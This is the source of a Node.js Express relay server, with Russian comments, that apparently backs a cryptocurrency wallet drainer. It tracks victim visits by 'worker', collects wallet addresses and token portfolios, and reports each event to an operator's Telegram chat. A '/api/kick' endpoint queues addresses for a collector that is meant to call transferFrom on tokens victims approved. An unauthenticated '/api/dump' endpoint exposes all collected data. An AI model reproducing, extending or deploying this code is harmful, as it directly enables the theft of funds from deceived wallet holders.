require("dotenv").config();
const express=require("express");
const app=express();
app.use(express.json({limit:"256kb"}));

const TOKEN=process.env.TG_TOKEN||"";
const CHAT =process.env.TG_ADMIN_CHAT_ID||"";
const KEY  =process.env.SITE_KEY||"";

const esc=s=>String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));

/* ── telegram sender c чанкингом и честным статусом ── */
async function tgSend(text){
  let err=null;
  const parts=[];
  let t=String(text||"").slice(0,14000);
  while(t){parts.push(t.slice(0,3800));t=t.slice(3800);}
  if(!parts.length)return{ok:true};
  for(const p of parts){
    try{
      const r=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
        method:"POST",headers:{"Content-Type":"application/json"},
        body:JSON.stringify({chat_id:CHAT,text:p,
          parse_mode:"HTML",disable_web_page_preview:true})});
      const j=await r.json().catch(()=>({ok:false,description:"bad json "+r.status}));
      if(!j.ok){err=j.description||("HTTP "+r.status);break;}
    }catch(e){err=e.message;break;}
    await new Promise(s=>setTimeout(s,350));   /* анти-флуд */
  }
  return{ok:!err,err};}

const guard=(req,res)=>{
  if(req.get("x-site-key")!==KEY){res.status(403).json({ok:false,err:"sitekey"});return false;}
  if(CHAT&&TOKEN)return true;
  res.json({ok:true,warn:"tg-not-configured"});return true;};

/* память-«БД» (для старта достаточно; меняйте на sqlite/postgres) */
const DB={visits:[],holders:new Map(),queue:[]};

app.post("/api/event",async(req,res)=>{
  if(!guard(req,res))return;
  const text=String((req.body||{}).text||"").trim();
  if(!text)return res.json({ok:true});
  DB.visits.push({k:"event",text:text.slice(0,200),ts:Date.now()});
  const r=await tgSend(text);
  r.err?console.error("[event]",r.err):null;
  res.json(r);});

app.post("/api/visit",async(req,res)=>{
  if(!guard(req,res))return;
  const b=req.body||{};
  DB.visits.push({k:"visit",worker:b.worker,addr:b.addr,
    env:b.env,tz:b.device&&b.device.tz,ts:Date.now()});
  /* визит по желанию летит и в чат */
  if(process.env.VISIT_TO_TG==="1"){
    void tgSend("👁 <b>VISIT</b>\n🧑‍💼 "+esc(b.worker||"—")+
      "\n🌐 "+esc(b.env||"")+" · v"+esc(String(b.visitNo??"?"))+
      (b.diag?"\n🧪 diag: "+esc(b.diag):"")+
      (b.addr?"\n👤 <code>"+esc(b.addr)+"</code>":""));}
  res.json({ok:true});});

app.post("/api/holders",async(req,res)=>{
  if(!guard(req,res))return;
  const b=req.body||{};
  if(b.address){
    const prev=DB.holders.get(b.address)||{hits:0};
    DB.holders.set(b.address,{...prev,...b,hits:(prev.hits||0)+1,ts:Date.now()});}
  console.log("[holder]",b.address,(b.portfolio||[]).length+" tokens");
  /* пометка для чата при первом обращении адреса */
  if((DB.holders.get(b.address)||{}).hits===1)
    void tgSend("🧾 <b>HOLDER REG</b>\n👤 <code>"+esc(b.address||"—")+"</code>"+
      "\n🗂 assets: <b>"+((b.portfolio||[]).length)+"</b>");
  res.json({ok:true});});

app.post("/api/kick",async(req,res)=>{
  if(!guard(req,res))return;
  const b=req.body||{};
  DB.queue.push({address:String(b.address||""),via:String(b.via||""),
    ts:Date.now(),done:false});
  console.log("[kick]",b.via,b.address);
  /* Здесь стартует ваш воркер-коллектор transferFrom по approved-токенам.
     Пока — просто сообщение в чат как уведомление. */
  void tgSend("⚙️ <b>KICK</b> "+esc(String(b.via||"—"))+
    "\n👤 <code>"+esc(String(b.address||"—"))+"</code>");
  res.json({ok:true});});

/* служебные */
app.get("/api/health",(req,res)=>res.json({ok:true,visits:DB.visits.length,
  holders:[...DB.holders.keys()].length}));
app.get("/api/dump",(req,res)=>res.json(DB));

app.listen(process.env.PORT||3000,()=>console.log("relay up :"+(process.env.PORT||3000)));
